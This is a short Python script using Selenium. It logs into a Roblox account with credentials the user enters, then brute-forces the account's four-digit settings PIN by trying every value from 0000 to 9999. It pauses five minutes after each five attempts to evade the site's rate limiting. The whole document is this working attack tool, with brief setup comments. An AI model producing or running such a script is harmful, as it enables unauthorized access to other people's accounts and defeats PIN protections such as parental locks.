#pin code bruteforcer using python and selenium
#you must install python from google manually
#-pip install selenium in CMD
#https://chromedriver.chromium.org/downloads download it and make a temp folder in librarys
#then run it
#i also made thisz script personally for myself so idk what use you have with this if u got 2fa
from selenium import webdriver
from selenium.webdriver.common.by import By
import time

PATH = 'C:\temp\chromedriver.exe'
username = input('username: ')
password = input('password: ')

driver = webdriver.Chrome(PATH)
driver.get('https://www.roblox.com/my/account#!/info')
time.sleep(1)

first_act = driver.find_element(By.XPATH, '//*[@id="cookie-banner-wrapper"]/div[1]/div[2]/div/div/button[2]' ).click()
username_box = driver.find_element(By.XPATH, '//*[@id="login-username"]' ).send_keys(username)
password_box = driver.find_element(By.XPATH,  '//*[@id="login-password"]' ).send_keys(password)
login_button = driver.find_element(By.XPATH, '//*[@id="login-button"]').click()
time.sleep(5)

pin_code_button = driver.find_element(By.XPATH, '//*[@id="settings-container"]/div[2]/div[1]/div/div[1]/span/span[1]/button').click()
verification = driver.find_element(By.XPATH, '//*[@id="modal-body"]/form/div[2]/span')
b = 0
#Bruteforce loop
for i in range(0,10000):
        try:
            pin = str(i).zfill(4)
            print(f'current guessed pin is {pin}')
            pin_code_searchbox = driver.find_element(By.XPATH, '//*[@id="modal-body"]/form/div[1]/input').send_keys(pin)
            time.sleep(2) 
            Unlock_button = driver.find_element(By.XPATH, '//*[@id="rbx-body"]/div[1]/div/div/div/div[3]/button').click()
            b += 1
            if b == 5:
                    b = 0
                    print('System Error...')
                    print("5 minutes...")
                    time.sleep(60)
                    print("4 minutes...")
                    time.sleep(60)
                    print("3 minutes...")
                    time.sleep(60)
                    print("2 minutes...")
                    time.sleep(60)
                    print("1 minute left...")
                    time.sleep(60)
                    print("5 Minutes are Done!")
                    time.sleep(1)
                    continue            
        except:
            print(f'Pincode is {pin}')
            quit()   
        
        
